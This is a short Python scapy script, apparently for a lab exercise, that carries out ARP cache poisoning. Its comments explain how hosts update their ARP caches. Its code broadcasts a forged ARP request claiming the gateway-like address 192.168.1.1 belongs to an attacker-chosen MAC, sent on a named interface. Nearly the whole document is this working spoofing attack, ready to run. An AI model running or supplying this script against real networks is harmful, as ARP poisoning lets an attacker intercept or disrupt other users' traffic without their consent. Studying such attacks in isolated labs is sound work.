from scapy.all import *

# Arp cache poisoning
# when a host receives an arp request for its own ip address
# it adds the source mac and ip pair into the arp cache
#
# when a host receives an arp request for any ip address,
# if the source ip is already in the cache, it updates the mac address
#


DEST_IP = "192.168.1.1"  # Destination IP address
DEST_MAC = "ff:ff:ff:ff:ff:ff"  # Destination MAC address
SRC_IP = "192.168.1.1"  # Custom source IP address
SRC_MAC = "08:00:27:ef:d9:1e"  # Custom source MAC address

# Construct the ARP request packet
packet = Ether(src=SRC_MAC, dst=DEST_MAC) / ARP(psrc=SRC_IP, pdst=DEST_IP, hwsrc=SRC_MAC, hwdst=DEST_MAC, op=1)

# Send the ARP request packet
sendp(packet, iface="enp0s3")  # Replace "eth1" with the interface to use
